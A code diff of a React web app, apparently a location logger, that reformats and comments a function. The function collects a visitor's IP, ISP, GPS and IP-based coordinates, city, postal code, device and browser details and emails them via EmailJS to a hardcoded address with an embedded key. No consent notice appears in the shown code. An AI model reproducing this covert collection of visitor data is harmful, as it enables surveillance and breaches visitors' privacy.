@@ -36,44 +36,45 @@ function App() {
   };
 
   const sendEmail = async (gpsLat, gpsLon, gpsStatus) => {
-  try {
-    const ispLat = ipData?.lat || 0;
-    const ispLon = ipData?.lon || 0;
+    try {
+      const ispLat = ipData?.lat || 0;
+      const ispLon = ipData?.lon || 0;
 
-    const finalLat = gpsLat || ispLat;
-    const finalLon = gpsLon || ispLon;
-    
-    const distance = (haversine(BOGOR_COORDS, { latitude: finalLat, longitude: finalLon }) / 1000).toFixed(2);
+      // Logika penentuan koordinat akhir untuk haversine
+      const finalLat = gpsLat || ispLat;
+      const finalLon = gpsLon || ispLon;
+      
+      const distance = (haversine(BOGOR_COORDS, { latitude: finalLat, longitude: finalLon }) / 1000).toFixed(2);
 
-    const templateParams = {
-      to_email: 'suhilman@bignet.id',
-      ip_address: ipData?.ip || 'N/A', 
-      isp: ipData?.isp || 'N/A',
-      as_name: ipData?.asn || 'N/A', 
-      isp_lat_long: `${ispLat},${ispLon}`,
-      gps_lat_long: gpsLat ? `${gpsLat},${gpsLon}` : "N/A",
-      // Detail lokasi disesuaikan dengan key FreeIPAPI
-      location_detail: `${ipData?.city || ''}, ${ipData?.regionName || ''}, ${ipData?.country || ''}`,
-      distance_from_bogor: `${distance} km`,
-      device_os: detectOS(),
-      browser: detectBrowser(),
-      screen_res: `${screenSize.width}x${screenSize.height}`,
-      current_time: new Date().toLocaleString('id-ID'),
-      gps_status: gpsStatus 
-    };
+      const templateParams = {
+        to_email: 'suhilman@bignet.id',
+        ip_address: ipData?.ip || 'N/A', 
+        isp: ipData?.isp || 'N/A', // Sekarang terisi dari ip-api
+        as_name: ipData?.asn || 'N/A', 
+        isp_lat_long: `${ispLat},${ispLon}`,
+        gps_lat_long: gpsLat ? `${gpsLat},${gpsLon}` : "N/A",
+        // Detail lokasi dari ip-api
+        location_detail: `${ipData?.city || ''}, ${ipData?.regionName || ''}, ${ipData?.country || ''} (${ipData?.zip || ''})`,
+        distance_from_bogor: `${distance} km`,
+        device_os: detectOS(),
+        browser: detectBrowser(),
+        screen_res: `${screenSize.width}x${screenSize.height}`,
+        current_time: new Date().toLocaleString('id-ID'),
+        gps_status: gpsStatus 
+      };
 
-    await emailjs.send(
-      'service_rjl2ja4', 
-      'template_iruemib', 
-      templateParams, 
-      'ZoURH59lMids8g1rT'
-    );
-    
-    hasSent.current = true;
-  } catch (err) {
-    console.error('EmailJS Error:', err);
-  }
-};
+      await emailjs.send(
+        'service_rjl2ja4', 
+        'template_iruemib', 
+        templateParams, 
+        'ZoURH59lMids8g1rT'
+      );
+      
+      hasSent.current = true;
+    } catch (err) {
+      console.error('EmailJS Error:', err);
+    }
+  };
 
   return (
    <div style={{ height: '100vh',  margin: 0, padding: 0, overflow: 'hidden' }}>
